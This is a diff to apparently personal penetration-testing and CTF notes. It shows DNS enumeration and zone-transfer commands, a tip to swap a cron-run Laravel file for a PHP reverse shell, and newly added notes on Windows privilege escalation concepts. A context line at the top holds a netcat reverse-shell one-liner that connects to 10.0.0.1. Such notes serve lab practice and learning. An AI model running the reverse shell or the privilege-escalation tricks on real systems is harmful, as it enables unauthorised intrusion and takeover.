@@ -85,14 +85,14 @@ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 4242 >/tmp/f
 
 ## Enumerations
 ### DNS
-if the port 53 is open try to find if if there are some name resolved. /etc/resolv.conf ---> victim IP
+if the port 53 is open try to find  if there are some name resolved. /etc/resolv.conf ---> victim IP
 
 dig -x <victim-ip>
 
 Eg. dig cronos.htb any
 For whole zone tranasfer dig axfr @10.10.10.13 cronos.htb
 
-##Random Exploit collection
+## Random Exploit collection
 
 Here I am collectign some of the random exploits and their exploitation technqiues. Later I will categorised and group them to each group.
 
@@ -153,6 +153,43 @@ Eg. * * * * *	root	php /var/www/laravel/artisan schedule:run >> /dev/null 2>&1
 In this case you can simply replace the /var/www/laravel/artisan file with one liner php reverse shell.
 
 ## Windows Privilege Escalation
+The ultimate goal is to gain a shell running as administrator or system users. Windows privilege escalations can be simple(eg. a kernel exploits) or require a lot of reconnaissance on the compromised system. 
+In lot of cases it may not rely on a single misconfigurations, but may require you to think and combine multiple configurations. 
+
+## General Conecpts:
+All privilege esclations are effectively exmaples of a access control violations. Access control and user permission are intrinsically linked. When focusing on privilege escalations in windows, understanding how windows handles permission is very important. 
+
+## Permission in windows. 
+Two types of Account: 
+User account: Administrator and general account. 
+Service account: Used for running services in windows system. System account is the default service account which has highest privileges. Other default service account includes NETWORK SERVICE and LOCAL SERVICE. 
+
+## Groups
+
+User accounts can belong to multiple groups, and groups can have multipel users. 
+Groups allow easier access control to resources.
+Reular groups(eg. administrator, Users) have a list of members. 
+
+Pseudo groups (eg. "Authenticated Users) have a dynamic list of members which changes based on certain interactions. 
+
+## Resource
+In windows there are multiple types of resoure (also known as objects):
+** Files/Directories.
+** Registry Entries
+** Services
+Whether a user and or/group has a permission to perform a certain action on a resource depends on that resossurce's ACL(access control list)
+
+** ALC & ACE
+Permissions to access a certain resource in Winndows are controlled by the access control list (ACL). Each ACL is made up of zero or more access control entries. (ACEs)
+
+Each ACE defines the relationship between a principal (eg. a user,group) adn a certain access right. 
+
+
+** Tools
+Powerup and Sharpup
+They are similar tools to hunt for specific privilege escalations.
+* regular 
+
 ### Iperius Backup 6.1.0 - Privilege Escalation
 Scenario: On a VNC accessible machine this service is running. Use the exploit [46863](https://www.exploit-db.com/exploits/46863) in exploitdb.
 
